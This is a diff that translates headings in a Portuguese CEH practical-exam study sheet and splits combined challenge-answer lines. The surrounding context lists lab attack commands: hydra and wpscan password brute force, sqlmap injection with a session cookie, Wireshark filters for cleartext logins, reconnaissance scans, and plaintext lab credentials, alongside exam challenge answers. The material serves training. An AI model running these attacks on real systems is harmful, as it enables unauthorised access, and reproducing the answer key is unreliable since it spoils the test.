@@ -7,7 +7,7 @@
 ### PATH: Statistics → Conversations → TCP
 ### INFO: Source → 172.30.10.200
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 ### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.dst == 172.30.10.200  # envio de flag reset com payload vazio
 ### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.src == 172.30.10.200 
 ### FILTER: tcp.analysis.retransmission || tcp.analysis.out_of_order # Sequência de sessão quebrada
@@ -24,7 +24,7 @@
 ####    Form item: "txtusername" == "lee"
 ####    Form item: "txtpwd" == "test"
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 ### FILTER: http.request.method == POST && frame contains "txt"
 ### FILTER: http contains "username" || http contains "password"
 ### FILTER: tcp.port == 80 && http
@@ -52,7 +52,7 @@ curl -I certifiedhacker.com
 # nmap -sV -p 80,443 certifiedhacker.com
 ### INFO: Apache
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # whatweb -a 3 certifiedhacker.com
 # nc certifiedhacker.com 80
 # http -h certifiedhacker.com
@@ -74,7 +74,7 @@ dir
 type $ollers.txt
 ### INFO: Password to enter my crypto account: i2tr&^72546HJ*
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # hydra -l Martin -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
 # hydra -l Martin -p qwerty1234 192.168.10.101 ssh 
 # sshpass -p 'qwerty1234' ssh Martin@192.168.10.101
@@ -93,7 +93,7 @@ exit
 cat w_domain.com
 ### INFO: "id":"7867721010"
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # ftp ftp://nick:apple@192.168.10.111
 
 
@@ -105,7 +105,7 @@ nmap -sT -sV --version-light -T2 --open --top-ports 200 172.30.10.99
 nmap -p 8080 -sV 172.30.10.99
 ### INFO: 8080/tcp  open  http  Apache Tomcat/Coyote JSP engine 1.1
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # nmap -p 8080 -sV --version-light 172.30.10.99
 # nmap -p 8080 --script http-title,http-server-header 172.30.10.99
 # whatweb -a 3 http://172.30.10.99:8080
@@ -134,7 +134,7 @@ cat webpent.txt
 whatweb www.moviescope.com
 ### INFO: ..., Meta-Author[EC-Council], ...
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # ssh Martin@192.168.10.101
 # ### PASSWORD: qwerty1234
 # cd Music # CONECTADO VIA SSH
@@ -146,7 +146,8 @@ whatweb www.moviescope.com
 #------------------------------#
 
 
-# PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬 && PART III - Challenge 10  💬ANSWER: Content Security Policy💬
+# PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬
+# PART III - Challenge 10  💬ANSWER: Content Security Policy💬
 owasp-zap
 ### Automated Run → URL to attack: http://www.goodshopping.com → Attack
 ### Alerts → Vulnerable JS Library
@@ -182,7 +183,7 @@ grep -i "directory listing" report.txt
 grep -i "sensitive files" report.txt
 ### INFO: 12.36 Directory Listing of Sensitive Files
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # ftp Parker@192.168.10.144
 # ftp ftp://Parker:Passw0rd%401234@192.168.10.144
 # lftp -u Parker,Passw0rd@1234 192.168.10.144
@@ -204,7 +205,7 @@ wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u # Enumerar usuários
 wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
 ### INFO: Username: adam, Password: orange1234
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # curl -I http://www.cehorg.com:80
 # curl -I http://www.cehorg.com:8080
 # curl -I http://www.cehorg.com8080/DVWA
@@ -241,7 +242,8 @@ wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
 #------------------------------#
 
 
-# PART III - Challenge 14 💬ANSWER: 5💬 && # PART III - Challenge 15 💬ANSWER: 19💬
+# PART III - Challenge 14 💬ANSWER: 5💬
+# PART III - Challenge 15 💬ANSWER: 19💬
 #### GOOGLE: http://www.moviescope.com/ # Realizar login 
 ### USERNAME: lee
 ### PASSWORD: test
@@ -260,7 +262,7 @@ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNk
 ### INFO: WASC-19
 ### INFO: http://projects.webappsec.org/w/page/13246963/SQL Injection
 
-# ⚠️ COMANDOS IMPORTANTES
+# ⚠️ IMPORTANT COMMANDS
 # sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --sql-query="SELECT COUNT(*) FROM User_Login" --batch
 # sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --batch --level=1 --risk=1
 
